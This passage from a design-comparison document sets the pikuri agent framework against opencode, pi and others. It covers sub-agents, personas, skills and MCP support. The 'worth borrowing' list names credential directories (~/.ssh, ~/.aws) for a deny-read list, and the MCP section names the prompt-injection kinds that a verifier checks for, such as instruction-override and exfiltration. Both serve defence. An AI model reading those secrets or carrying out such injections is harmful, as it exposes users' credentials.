resolution (`project/instance-context.ts:18-23`). MCP servers spawn
as raw subprocesses inheriting `process.env`; schemas loaded
eagerly (`mcp/index.ts:412-445, 513-549`). Sub-agent presets
`general` / `explore` / `scout` use `"*": "deny"` with selective
allows; parent denies propagate into the child. Skills load from
arbitrary URLs with no signature / integrity check
(`skill/discovery.ts:54-104`). No egress controls, no provider
warnings.

**Worth borrowing (or considering) for pikuri.**
- **Disk spillover for over-cap output** (both). Per-tool byte caps
  already exist in `Bash` / `Read` / `WebScrape`; the missing piece
  is writing the overflow to a tempfile and returning the path so the
  LLM can `grep` it. (Cross-cutting version tracked in
  `ideas/security-open-questions.md` §"Output-size DoS and cost".)
- **Sub-agent toolset narrowing** — *shipped* via personas; see
  §"Sub-agents" above.
- **opencode's `(permission-name, glob-pattern)` ruleset shape** if
  `Confirmer` ever expands beyond binary approve/deny (C-tier #7 in
  §"Ideas to borrow").
- **PI's credential-dir deny-read defaults** (`~/.ssh`, `~/.aws`,
  `~/.gnupg`) — a `Workspace::Filesystem` default denylist gives some
  real protection even without a sandbox, and it's a one-method
  change. Same for deny-write on `.env*` / `*.pem` / `*.key`.
  (Partially shipped — `Filesystem::AllowAll` already carries a
  credential denylist; see §"Permission / sandboxing" above.)
- **Gondolin's secret-placeholder pattern.** A tool surface where env
  vars are placeholders and real values flow only through a curated
  egress proxy is a structural defense against exfil-via-prompt-
  injection — not "approval prompt the user is no longer reading."
  Heavyweight to implement (needs an HTTP/TLS interceptor); flagged
  as future-thought.
- **opencode's explicit "this is UX, not security" framing** in
  their `SECURITY.md` is the honest baseline pikuri's
  [`SECURITY.md`](SECURITY.md) borrows directly under "Non-goals".

**Mental model worth recording:** PI itself ships no isolation in
core. It offers *two extensions of different weights* — the
bubblewrap `sandbox` (bash-only, lighter) and a Gondolin micro-VM
integration (full Linux VM, full toolset). The user-facing "run pi
in a sandbox" story is real, but user-configured and opt-in, not
default. PI is thus prior art for **"ship the sandbox primitive
separately, let the user opt in at the weight they need"** —
different shape from opencode's explicit "we're not a sandbox, run
it in Docker yourself."

---

## Sub-agents

- **pikuri** (`Pikuri::SubAgent::SubAgentTool < Pikuri::Tool`,
  shipped in the `pikuri-subagents` gem and wired via
  `c.add_extension Pikuri::SubAgent::Extension.new(personas: [...])`
  inside the `Agent.new` block): the LLM-visible `agent` tool
  delegates to a fresh `Agent` by *persona name*. A `Persona` is a
  five-field record (`name`, `description`, `tool_names`,
  `system_prompt`, `max_steps`); spawning runs the persona's
  `system_prompt` verbatim (no inheritance from the parent), with
  the subset of `parent.tools` whose `name` appears in
  `persona.tool_names` (parent tool *instances* are reused so any
  workspace/confirmer wiring travels along), and a fresh
  `StepLimit` at `persona.max_steps`. The parent's `transport`,
  `cancellable`, `context_window_cap`, and `streaming` flag travel
  through unchanged. Listeners propagate via a duck-typed
  `for_sub_agent(id:)` convention — `Terminal` pads with the
  child's id, `TokenLog` tags a fresh per-agent snapshot,
  `RateLimited` splits its bucket. Controls don't use the same
  hook (the propagation policy is inlined in
  `SubAgentTool#execute` — fresh `StepLimit` at the persona's max,
  shared parent `Cancellable` by reference, `nil` `Interloper`).
  Extensions are *not* inherited — if a persona needs MCP or
  skills, the persona ships its own wiring. Recursion is
  structurally impossible: no bundled persona lists `agent` in its
  `tool_names`, so a child has no `agent` tool to call.
- **ruby_llm**: no built-in sub-agent.
- **langchainrb**: no built-in sub-agent. Could be modeled by
  instantiating multiple `Assistant`s but there's no first-class
  delegation / filtered-tool / control-propagation story.
- **pi**: not in core; pushed to extensions.
- **opencode** (`task` tool, `src/tool/task.ts:32–174`):
  - each task creates a **new `Session`** (not just a new chat history) —
    backed by SQLite, so sessions are inspectable and resumable
  - takes an optional `task_id` to resume a prior subagent session
  - permissions are derived from the parent and filtered to what the parent
    is allowed to do
  - tool list can be different (unavailable tools passed as `{name: false}`)
  - return wrapped in `<task_result>...</task_result>` tags

**Takeaway.** Pikuri's `agent` tool is closer in spirit to
opencode's `task` than to a simple "filter the parent's tools"
model: each delegation is identified by a *persona* the host
registers explicitly, so the child's toolset and system prompt
are both declared up front rather than inherited and trimmed.
That's where privilege separation comes from — a `FILE_MINER` persona
spawned from a coding agent with `bash` in scope still doesn't
get `bash`, because `bash` isn't in the persona's `tool_names`.
Opencode's `task` adds session persistence and resumability on
top, backed by SQLite; that's a fair amount of machinery for one
feature, not worth porting until pikuri has another reason to
introduce a session store.

### Bundled persona inventory

The mechanism comparison above is about *how* sub-agents work; this is
about *what ships by default*. Each project picks a different mid-line
between "ship nothing, host wires up everything" and "ship the whole
zoo."

| Project | Personas shipped | Source |
| --- | --- | --- |
| pikuri | `RESEARCHER` (web_search/web_scrape/fetch, 20 steps); `FILE_MINER` (file_list/read/grep/glob, 30 steps); `GIT_REPO_RESEARCHER` (git_clone + file_list/read/grep/glob + web reads, 30 steps, per-invocation temp workspace) — queued: `reviewer` | `pikuri-subagents/lib/pikuri/sub_agent/{researcher,file_miner}.rb`; `pikuri-code/lib/pikuri/code/git_repo_researcher.rb` |
| ruby_llm / langchainrb | none — no sub-agent surface | — |
| pi | `planner`, `reviewer`, `scout`, `worker` | `packages/coding-agent/examples/extensions/subagent/agents/` |
| opencode | `build`, `plan` (primary modes); `general`, `explore`, `scout` (subagents); `compaction`, `title`, `summary` (hidden housekeeping) | `packages/opencode/src/agent/agent.ts` |
| Claude Code | `general-purpose`, `Explore`, `Plan`, `statusline-setup`, `claude-code-guide` | <https://code.claude.com/docs/en/sub-agents> |

Cross-cutting by role:

| Role | pikuri | pi | opencode | Claude Code |
| --- | --- | --- | --- | --- |
| read-only recon (cheap model) | `RESEARCHER` (web) + `FILE_MINER` (fs) + `GIT_REPO_RESEARCHER` (clone-and-dig) | `scout` (Haiku) | `explore` + `scout` | `Explore` (Haiku) |
| planner (read-only, intent-shaping) | — | `planner` (Sonnet) | `plan` (primary mode, not subagent) | `Plan` |
| reviewer (read-only correctness) | queued | `reviewer` (Sonnet, bash for git) | — | — |
| general-purpose catch-all | — (escape hatch documented in `ideas/subagent-deferrals.md`) | `worker` | `general` | `general-purpose` |
| infra housekeeping | — (synthesizer is hard-coded) | — | `compaction`, `title`, `summary` (tools: none) | — |
| UX helpers (slash-command-driven) | — (no slash commands) | — | — | `statusline-setup`, `claude-code-guide` |

**Takeaway.** Pikuri ships a lean persona set — three
(`RESEARCHER` + `FILE_MINER` + `GIT_REPO_RESEARCHER`) vs. pi's four,
opencode's eight, Claude Code's five — which matches the
read-it-in-an-evening ceiling: ship the personas that demonstrate
the mechanism along each axis, document the rest as queued in
`ideas/subagent-deferrals.md`, let downstream gems publish more if the ecosystem needs
them. The three break down as: `RESEARCHER` (web recon) and `FILE_MINER`
(fs recon) are the direct analogs of pi's `scout` / opencode's
`explore` / Claude Code's `Explore` — the universal "read-only
recon agent on a cheap model" role, split by *what* gets read.
`GIT_REPO_RESEARCHER` is the third axis: clone-and-dig over a
public repo, in its own per-invocation throwaway workspace. None
of the comparison set ships a direct analog — the closest move is
opencode/pi letting `bash` (with `git`) reach inside a sandbox,
but the persona shape collapses that into one privilege-separated
delegation with no `bash` in scope. The
next-strongest signal is "planner = read-only + intent-shaping,"
which pikuri has not committed to either way.

Notable shape differences:

- **opencode mixes primary modes and subagents in one registry** —
  `build` and `plan` are not delegated children but modes of the main
  agent itself. pi and Claude Code (and pikuri) keep "modes" separate
  from "subagents."
- **opencode's hidden housekeeping agents** (`compaction` / `title` /
  `summary`) dress LLM-driven internal workflows up as personas with
  `tools: none`. Pikuri's equivalent — step-exhaustion synthesis —
  is hard-coded as `Pikuri::Agent::Synthesizer`, an internal recovery
  path the LLM never picks. Different style choice, same underlying
  trick (LLM-drive an internal task without exposing it as a tool).
- **pi ships personas under `examples/`**, leaving the persona
  inventory to be a per-host decision rather than a harness-core fact.
  Same shape as pikuri keeping bundled personas in pikuri-subagents
  rather than pikuri-core.
- **Per-persona model pinning** — only pi does this (haiku for
  `scout`, sonnet for the rest). Pikuri's `ideas/subagent-deferrals.md`
  §"Per-persona `model:`"
  records this as a deferred feature ("requires `ChatTransport`
  variations per sub-agent").

---

## Skills and MCP (pikuri additions since the last writeup)

Two extension surfaces pikuri grew that the comparison set hits unevenly:

### Skills

- **pikuri**: `Tool::SkillCatalog` (abstract base) +
  `SkillCatalog::Bundled` (on-disk scanner) implement the
  [Agent Skills standard](https://agentskills.io/specification). Scans
  `.pikuri/skills`, `.claude/skills`, `.agents/skills` walking from CWD
  up to the git root, plus the same three under `~/`. Project beats
  global; within each tier, `.pikuri` ➜ `.claude` ➜ `.agents`.
  Frontmatter validation is lenient — only a missing `description` is
  fatal (everything else warns + loads). When the catalog is non-empty,
  `Agent#initialize` appends a `<available_skills>` XML block (same shape
  as PI's) to the system prompt and registers the `skill` tool that
  loads a named skill's body on demand.
- **pi**: implements the same Agent Skills standard; pikuri's
  implementation reuses pi's XML block shape so a skill folder authored
  against any compliant harness renders consistently here.
- **opencode**: ships its own skill mechanism (related but pre-standard).
- **ruby_llm, langchainrb**: no concept of skills.

### MCP (Model Context Protocol)

- **pikuri**: `Mcp::Registry` (pure config) + `Mcp::Servers` (runtime —
  spawns servers, holds clients, registers `at_exit`) + per-client
  `Mcp::ClientWrapper` (restart-on-stdio-death retry) +
  `Mcp::Synthesizer` (LLM-driven summarization of MCP tool surfaces
  whose `instructions`/`serverInfo.title` are unhelpful) +
  `Mcp::Verifier` (pre-flight prompt-injection check: mechanical
  Unicode pre-pass + LLM inspection for instruction-override,
  exfiltration, tool-chain hijacking, authority-impersonation) +
  `Mcp::Cache` (on-disk, keyed on the full server surface so any
  upstream change invalidates). Two transports — stdio (carve-out
  from the `Subprocess.spawn` chokepoint) and HTTP (plain Faraday). MCP
  tools bypass `Pikuri::Tool` and are synthesized as raw `RubyLLM::Tool`
  subclasses with a provenance prefix; the LLM connects on demand via
  the auto-registered `mcp_connect` tool.
- **opencode**: ships MCP support; pikuri's `Mcp::Servers` is informed
  by opencode's shape but uses the `mcp` Ruby gem for the transport
  layer.
- **ruby_llm, langchainrb, pi (core)**: no MCP. Could be wired
  externally via the `mcp` gem.

**Takeaway.** Both Skills and MCP are extension surfaces pikuri added
deliberately — Skills for "give the agent static text knowledge that
loads on demand" and MCP for "expose third-party tool servers the user
already runs." Both auto-wire when their corresponding registry/catalog
is non-empty, and `EMPTY` singletons let the no-feature path stay zero-
config. The `Mcp::Verifier` is the novel-to-pikuri piece — pre-flight
injection scanning of an MCP server's surface before any tool is
exposed to the LLM, with `InjectionDetected` aborting startup for that
server.

---

## Ideas to borrow

Sorted by fit-for-pikuri, from "do this now" to "out of scope". Items
marked **DONE** have shipped; items marked **FREE NOW** require nothing
more than wiring through ruby_llm's existing primitive.

### A-tier — high fit, low cost

1. **Bring all tool descriptions up to the opencode bar** — **DONE**.
   All bundled tools (calculator, web_search, web_scrape, fetch,
   sub_agent, skill, read, write, edit, grep, glob, file_list, bash,
   mcp_connect)
   use the heredoc summary + `Usage:` bullets shape. The pikuri variant
   of the pattern factors universal `Error: ...` recovery into each
   binary's system prompt rather than restating it per-tool. Convention
   documented in `CLAUDE.md`.
2. **Examples in parameter descriptions** — **DONE**. Every string
   parameter carries an inline `e.g. "..."` example in the ruby_llm
   pattern. Integer parameters describe their default and cap, which
   serves as the anchoring equivalent. Codified in `CLAUDE.md`.
3. **Tool-emitted `:halt` signal** — **FREE NOW**. ruby_llm's
   `RubyLLM::Tool::Halt` lets a tool short-circuit: returning
   `halt("done")` from `execute` ends the chat without a follow-up
   model call. Pikuri's synthetic-tool factory already passes any
   return value through verbatim, so the only thing missing is a
   `Tool::Halt` helper or convention in pikuri's API and a doc note in
   `pikuri-core/lib/pikuri/tool.rb`. Cheap.

### B-tier — worth it but more invasive

4. **Method-signature introspection as a Parameters fallback** (ruby_llm).
   When a tool's `execute` Proc has typed kwargs, derive the schema
   automatically. Trade-off: descriptions still need to live somewhere — so
   this saves typing only for the dumbest tools. Keep the explicit builder as
   the primary path.
5. **Tool descriptions in separate `.txt` files** (opencode pattern). Easier
   to iterate on a multi-paragraph description without touching Ruby. Wait
   until any single description gets long enough to be awkward in a heredoc.
6. **One-class-many-functions tools** (langchainrb's `define_function`
   pattern, where a `MovieInfoTool` class exposes both `search_movie` and
   `get_movie_details` as separate function entries). Reduces boilerplate
   when a single capability really does have multiple operations. Today
   pikuri's coding tools each have their own class; bundling them into a
   `FileSystem` tool with multiple functions would lose the per-tool
   workspace/confirmer wiring but might be worth revisiting for tightly-
   coupled tool families.

### C-tier — only when scope changes

7. **Permission system with glob rules** (opencode). Pikuri ships
   `Workspace` + `Confirmer` as v1; the three-action `allow` / `deny` /
   `ask` glob model is the right next step once friction shows up.
   Tracked in `ideas/coding-agent.md`.
8. **Structured event stream** — **DONE**. The `Agent::Event` sealed
   hierarchy + four bundled listeners covers the surface that was a
   `puts`-only path in the previous writeup. New rendering sinks (web
   UI, JSON log, TUI) plug in by subclassing `Listener::Base`.
9. **Streaming deltas** — **DONE**. Opt-in via `Agent.new(streaming:
   true)`; per-chunk `{Thinking,Assistant}Delta` events flow alongside
   the message-level bookends and propagate to sub-agents and the
   synthesizer consistently. The bundled `Terminal` listener still
   renders on message bookends; a delta-rendering listener is the
   straightforward next step.
10. **Pluggable Operations interfaces** (pi). Lets a `bash` tool delegate to
    SSH/sandbox/cloud. Pikuri's `Subprocess.spawn` chokepoint is the
    seam where this would hook in; today it only spawns local.
11. **Multi-provider abstraction** — **DONE** via the ruby_llm
    migration. Switching pikuri from llama.cpp/OpenAI-shape to
    Anthropic / Gemini / Bedrock / Ollama / etc. is a one-block edit
    in each `bin/pikuri-*`'s `RubyLLM.configure`. No library code change.
12. **Vector search / RAG primitives** (langchainrb). Pikuri is an agent,
    not a RAG framework — out of scope by design. If a future binary
    needs RAG, it can compose `langchainrb`'s vector stores externally
    rather than pulling that scope into pikuri itself.

### Out of scope

13. **Effect-based service architecture** (opencode). Massively too heavy
    for a project this size.
14. **LSP integration** (opencode). Deferred under "Coding-agent
    deferrals" until a concrete use case shows up.
15. **Steering / follow-up message queues** (pi). Pikuri's
    `Control::Interloper` already covers the mid-loop-injection case
    that motivated this idea in `bin/pikuri-code`'s REPL; a richer
    pi-style queue model is unmotivated today.
16. **Persistent / resumable subagent sessions** (opencode). Requires a
    session store. Not worth it for one feature.

---

## Sources

- ruby_llm: `/tmp/agent-comparison/ruby_llm` — `lib/ruby_llm/chat.rb`,
  `lib/ruby_llm/tool.rb`, `lib/ruby_llm/message.rb`
- langchainrb: `/tmp/langchainrb` — `lib/langchain/assistant.rb`,
  `lib/langchain/tool_definition.rb`, `lib/langchain/tool/*.rb`,
  `lib/langchain/llm/`, `lib/langchain/vectorsearch/`, `README.md`
- pi: `/tmp/agent-comparison/pi` — `packages/agent/src/agent-loop.ts`,
  `packages/agent/src/types.ts`, `packages/coding-agent/src/core/tools/`
- opencode: `/tmp/agent-comparison/opencode` — `packages/opencode/src/session/processor.ts`,
  `packages/opencode/src/tool/`, `packages/opencode/src/permission/index.ts`,
  `packages/opencode/src/provider/provider.ts`
